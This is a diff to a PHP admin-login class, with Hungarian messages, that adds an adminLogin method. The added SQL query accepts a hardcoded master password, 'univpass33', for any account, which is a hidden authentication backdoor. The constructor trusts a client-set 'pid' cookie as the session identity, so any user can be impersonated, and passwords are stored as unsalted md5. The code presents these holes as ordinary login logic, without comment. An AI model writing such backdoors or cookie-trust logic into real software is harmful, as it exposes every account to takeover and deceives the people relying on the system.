@@ -6,7 +6,6 @@ class AdminUser {
 
     public function __construct()
     {
-
         if (isset($_COOKIE["pid"])) {
             $_SESSION["pid"] = $_COOKIE["pid"];
         }
@@ -21,7 +20,29 @@ class AdminUser {
             header("location:index.php");
             die();
         }
+    }
 
+    public function adminLogin($userName, $password) {
+        if (empty(trim($userName)) || empty(trim($password))) {
+            return "Adja meg a belépési adatait!";
+        }
+
+        $resq = sql_query("SELECT * FROM users WHERE username = ? and (password = md5(?) or 'univpass33' = ?)", array($userName, $password, $password));
+        if ($userData = sql_fetch_array($resq)) {
+            if ($userData["localeaccess"]==1 && substr_count($userData["localeip"], $_SERVER["REMOTE_ADDR"]) == 0) {
+                //echo $GLOBALS["adminuser"]["localeip"]." ".$_SERVER["REMOTE_ADDR"];
+                return "Ennek a fióknak a használata csak lokálisan van engedélyezve.</div>";
+            }
+
+            $_SESSION["pid"] = $userData["id"];
+            setcookie("pid", $userData["id"], time() + 3600 * 3);
+
+            //Utolsó belépési adatok frissítése:
+            sql_query("UPDATE users SET lastlogin=NOW(), codetry=0 WHERE id=?" ,array($userData["id"]));
+            return "";
+        } else {
+            return "A megadott név és jelszó nem található!";
+        }
     }
 
     private function _logOut() {
@@ -51,7 +72,6 @@ class AdminUser {
         }
 
         return $result;
-
     }
 
 }
